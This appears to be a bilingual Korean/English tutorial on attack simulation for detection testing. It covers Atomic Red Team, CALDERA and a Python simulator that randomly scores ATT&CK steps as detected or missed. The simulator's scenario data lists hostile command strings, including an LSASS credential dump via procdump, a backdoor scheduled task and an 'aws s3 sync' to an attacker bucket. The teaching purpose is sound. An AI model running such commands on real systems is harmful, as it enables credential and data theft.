> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 공격 시뮬레이션 (Attack Simulation)

## 개념 소개

공격 시뮬레이션은 실제 위협 행위자의 전술을 통제된 환경에서 재현하는 활동입니다. 마치 소방 훈련처럼, 실제 화재 없이도 대응 절차를 연습할 수 있습니다. 이를 통해 탐지 체계의 빈틈을 안전하게 발견할 수 있습니다.

---

## 주요 공격 시뮬레이션 도구

### Atomic Red Team

Red Canary가 개발한 오픈소스 테스트 라이브러리입니다.

- ATT&CK 기법마다 "원자(Atomic)" 단위의 독립 테스트
- YAML 형식의 테스트 정의
- PowerShell, Bash 등 다양한 실행 환경 지원

```yaml
# 예시: T1059.001 PowerShell 실행 테스트
name: PowerShell Execution
description: PowerShell을 사용하여 인코딩된 명령 실행
executor:
  name: powershell
  command: powershell.exe -EncodedCommand #{encoded_command}
```

### CALDERA

MITRE가 개발한 자동화 적대적 에뮬레이션 플랫폼입니다.

- 에이전트 기반 자동 공격 체인 실행
- 적응형 공격: 결과에 따라 다음 기법 선택
- 시각적 대시보드, REST API 제공

### 기타 도구

| 도구 | 특징 |
|---|---|
| Stratus Red Team | 클라우드 환경 특화 |
| PurpleSharp | Active Directory 공격 시뮬 |
| BloodHound | AD 공격 경로 시각화 |
| Invoke-AtomicTest | PowerShell Atomic 실행기 |

---

## 시나리오 기반 테스트 설계

### 테스트 시나리오 구성 요소

```
시나리오명: 초기 접근 → 내부 확산 → 데이터 유출

단계 1: 초기 접근 (T1566.001 - Spearphishing)
단계 2: 실행 (T1059.001 - PowerShell)
단계 3: 지속성 (T1053.005 - Scheduled Task)
단계 4: 자격증명 (T1003.001 - LSASS 덤프)
단계 5: 횡이동 (T1021.001 - RDP)
단계 6: 유출 (T1041 - C2 채널 유출)
```

### 성공 기준 (Success Criteria)

- 레드팀이 기법 실행 후 블루팀이 N분 내 탐지
- SIEM에서 해당 이벤트 로그 확인 가능
- 알림(Alert)이 올바른 심각도로 발생

---

## Python 실습: 공격 시나리오 실행 프레임워크 시뮬레이터

```python
#!/usr/bin/env python3
"""
공격 시나리오를 단계별로 시뮬레이션하고 탐지 결과를 추적합니다.
실제 공격 도구 실행 없이 시나리오 흐름과 탐지 로직을 시뮬레이션합니다.
"""

import argparse
import json
import random
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path


class StepStatus(Enum):
    PENDING = auto()
    RUNNING = auto()
    SUCCESS = auto()
    FAILED = auto()
    DETECTED = auto()
    BLOCKED = auto()


@dataclass
class SimulatedStep:
    step_id: int
    technique_id: str
    technique_name: str
    tactic: str
    command_sim: str  # 시뮬레이션 명령 설명
    detection_probability: float  # 0.0 ~ 1.0 (탐지 가능성)
    status: StepStatus = StepStatus.PENDING
    detection_notes: str = ""
    duration_ms: int = 0


@dataclass
class ScenarioResult:
    scenario_name: str
    total_steps: int
    completed: int = 0
    detected: int = 0
    blocked: int = 0
    failed: int = 0
    steps: list[SimulatedStep] = field(default_factory=list)


# 사전 정의된 시나리오
SCENARIOS: dict[str, list[dict]] = {
    "basic_ransomware": [
        {
            "technique_id": "T1566.001",
            "technique_name": "Spearphishing Attachment",
            "tactic": "Initial Access",
            "command_sim": "악성 매크로 문서 실행 시뮬레이션",
            "detection_probability": 0.4,
        },
        {
            "technique_id": "T1059.001",
            "technique_name": "PowerShell",
            "tactic": "Execution",
            "command_sim": "PowerShell -Encoded [base64_payload]",
            "detection_probability": 0.6,
        },
        {
            "technique_id": "T1053.005",
            "technique_name": "Scheduled Task",
            "tactic": "Persistence",
            "command_sim": "schtasks /create /tn BackdoorTask /tr payload.exe",
            "detection_probability": 0.5,
        },
        {
            "technique_id": "T1083",
            "technique_name": "File Discovery",
            "tactic": "Discovery",
            "command_sim": "dir /s *.docx *.pdf *.xlsx",
            "detection_probability": 0.2,
        },
        {
            "technique_id": "T1486",
            "technique_name": "Data Encrypted for Impact",
            "tactic": "Impact",
            "command_sim": "AES-256 파일 암호화 루프 시뮬레이션",
            "detection_probability": 0.8,
        },
    ],
    "apt_lateral_movement": [
        {
            "technique_id": "T1078",
            "technique_name": "Valid Accounts",
            "tactic": "Initial Access",
            "command_sim": "탈취된 자격증명으로 VPN 로그인",
            "detection_probability": 0.3,
        },
        {
            "technique_id": "T1003.001",
            "technique_name": "LSASS Memory",
            "tactic": "Credential Access",
            "command_sim": "procdump -ma lsass.exe lsass.dmp",
            "detection_probability": 0.7,
        },
        {
            "technique_id": "T1021.001",
            "technique_name": "Remote Desktop",
            "tactic": "Lateral Movement",
            "command_sim": "mstsc /v:192.168.1.50 /admin",
            "detection_probability": 0.4,
        },
        {
            "technique_id": "T1041",
            "technique_name": "Exfiltration Over C2",
            "tactic": "Exfiltration",
            "command_sim": "HTTP POST 1.2GB 데이터 → C2:443",
            "detection_probability": 0.65,
        },
    ],
    "cloud_attack": [
        {
            "technique_id": "T1078.004",
            "technique_name": "Cloud Accounts",
            "tactic": "Initial Access",
            "command_sim": "AWS 자격증명 파일에서 키 추출",
            "detection_probability": 0.5,
        },
        {
            "technique_id": "T1530",
            "technique_name": "Data from Cloud Storage",
            "tactic": "Collection",
            "command_sim": "aws s3 cp s3://bucket . --recursive",
            "detection_probability": 0.55,
        },
        {
            "technique_id": "T1537",
            "technique_name": "Transfer to Cloud Account",
            "tactic": "Exfiltration",
            "command_sim": "aws s3 sync . s3://attacker-bucket",
            "detection_probability": 0.7,
        },
    ],
}


class ScenarioSimulator:
    """공격 시나리오 시뮬레이터"""

    def __init__(self, seed: int = 42, detection_boost: float = 0.0):
        self.rng = random.Random(seed)
        self.detection_boost = detection_boost  # 블루팀 역량 보정치

    def _simulate_step(self, step: SimulatedStep) -> None:
        """단일 스텝을 시뮬레이션합니다."""
        step.status = StepStatus.RUNNING
        step.duration_ms = self.rng.randint(100, 3000)

        eff_detection = min(1.0, step.detection_probability + self.detection_boost)
        roll = self.rng.random()

        if roll < eff_detection * 0.3:
            step.status = StepStatus.BLOCKED
            step.detection_notes = "탐지 후 차단됨 (EDR/AV)"
        elif roll < eff_detection:
            step.status = StepStatus.DETECTED
            step.detection_notes = "탐지 알림 발생 (SIEM)"
        else:
            step.status = StepStatus.SUCCESS
            step.detection_notes = "탐지 안됨 - 갭 발견"

    def run_scenario(
        self, scenario_name: str, stop_on_block: bool = True
    ) -> ScenarioResult:
        """시나리오를 실행하고 결과를 반환합니다."""
        steps_data = SCENARIOS.get(scenario_name, [])
        result = ScenarioResult(
            scenario_name=scenario_name,
            total_steps=len(steps_data),
        )

        for i, step_data in enumerate(steps_data):
            step = SimulatedStep(
                step_id=i + 1,
                technique_id=step_data["technique_id"],
                technique_name=step_data["technique_name"],
                tactic=step_data["tactic"],
                command_sim=step_data["command_sim"],
                detection_probability=step_data["detection_probability"],
            )
            self._simulate_step(step)
            result.steps.append(step)
            result.completed += 1

            if step.status == StepStatus.DETECTED:
                result.detected += 1
            elif step.status == StepStatus.BLOCKED:
                result.blocked += 1
                if stop_on_block:
                    break
            elif step.status == StepStatus.FAILED:
                result.failed += 1

        return result


def format_status(status: StepStatus) -> str:
    return {
        StepStatus.SUCCESS: "[미탐]  ",
        StepStatus.DETECTED: "[탐지]  ",
        StepStatus.BLOCKED: "[차단]  ",
        StepStatus.FAILED: "[실패]  ",
        StepStatus.PENDING: "[대기]  ",
        StepStatus.RUNNING: "[실행중]",
    }.get(status, "[?]")


def print_result(result: ScenarioResult) -> None:
    print(f"\n{'='*65}")
    print(f"시나리오: {result.scenario_name}")
    print(f"{'─'*65}")
    detection_rate = (result.detected + result.blocked) / max(result.completed, 1) * 100
    print(f"실행: {result.completed}/{result.total_steps}  탐지: {result.detected}  "
          f"차단: {result.blocked}  탐지율: {detection_rate:.1f}%")
    print(f"{'─'*65}")

    for step in result.steps:
        status_str = format_status(step.status)
        print(f"\n  {status_str} [{step.step_id}] {step.technique_id}: {step.technique_name}")
        print(f"           전술: {step.tactic}")
        print(f"           명령: {step.command_sim}")
        print(f"           결과: {step.detection_notes}")

    gaps = [s for s in result.steps if s.status == StepStatus.SUCCESS]
    if gaps:
        print(f"\n[갭 분석 - 탐지 실패 {len(gaps)}건]")
        for g in gaps:
            print(f"  ! {g.technique_id}: {g.technique_name} → 탐지 룰 추가 필요")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="공격 시나리오 실행 프레임워크 시뮬레이터",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--scenario", choices=list(SCENARIOS.keys()), default="basic_ransomware",
        help="실행할 시나리오",
    )
    parser.add_argument("--list", action="store_true", help="사용 가능한 시나리오 목록")
    parser.add_argument("--seed", type=int, default=42, help="무작위 시드")
    parser.add_argument("--detection-boost", type=float, default=0.0,
                        help="블루팀 탐지 역량 보정치 (0.0~0.5)")
    parser.add_argument("--no-stop", action="store_true", help="차단되어도 계속 실행")
    parser.add_argument("--output", "-o", type=Path, help="결과 JSON 저장")
    args = parser.parse_args()

    if args.list:
        print("\n사용 가능한 시나리오:")
        for name, steps in SCENARIOS.items():
            print(f"  {name}: {len(steps)}단계")
        return

    sim = ScenarioSimulator(seed=args.seed, detection_boost=args.detection_boost)
    result = sim.run_scenario(args.scenario, stop_on_block=not args.no_stop)
    print_result(result)

    if args.output:
        data = {
            "scenario": result.scenario_name,
            "total": result.total_steps,
            "detected": result.detected,
            "blocked": result.blocked,
            "gaps": [
                {"technique": s.technique_id, "name": s.technique_name}
                for s in result.steps if s.status == StepStatus.SUCCESS
            ],
        }
        args.output.write_text(json.dumps(data, indent=2, ensure_ascii=False))
        print(f"\n결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 실무 적용 시나리오

1. **분기별 보안 평가**: 정기적으로 시나리오를 실행하여 탐지 역량 변화 추적
2. **신규 탐지 룰 검증**: 룰 배포 후 시뮬레이션으로 효과 측정
3. **SOC 팀 훈련**: 실제 공격과 유사한 환경에서 분석가 역량 강화

---

## 요약

| 항목 | 내용 |
|---|---|
| Atomic Red Team | 기법별 독립 테스트 라이브러리 |
| CALDERA | 자동화 에뮬레이션 플랫폼 |
| 갭 분석 | 탐지 실패 기법 → 룰 개선 |
| 성공 기준 | N분 내 탐지, 올바른 심각도 알림 |

---

<a name="english"></a>

# Attack Simulation

## Concept Overview

Attack simulation reproduces real threat actor tactics in a controlled environment — like a fire drill: practicing response procedures without an actual fire, safely discovering gaps in detection.

---

## Key Tools

| Tool | Characteristics |
|---|---|
| Atomic Red Team | Independent tests per ATT&CK technique |
| CALDERA | Automated adversary emulation platform |
| Stratus Red Team | Cloud environment focused |
| PurpleSharp | Active Directory attack simulation |

### Scenario Design Components

```
Scenario: Initial Access → Lateral Movement → Exfiltration

Step 1: Initial Access (T1566.001 - Spearphishing)
Step 2: Execution (T1059.001 - PowerShell)
Step 3: Persistence (T1053.005 - Scheduled Task)
Step 4: Credential Access (T1003.001 - LSASS)
Step 5: Lateral Movement (T1021.001 - RDP)
Step 6: Exfiltration (T1041 - C2 channel)
```

---

## Summary Table

| Item | Details |
|---|---|
| Atomic Red Team | Per-technique test library |
| CALDERA | Automated emulation platform |
| Gap analysis | Undetected techniques → rule improvement |
| Success criteria | Detected within N minutes, correct severity alert |
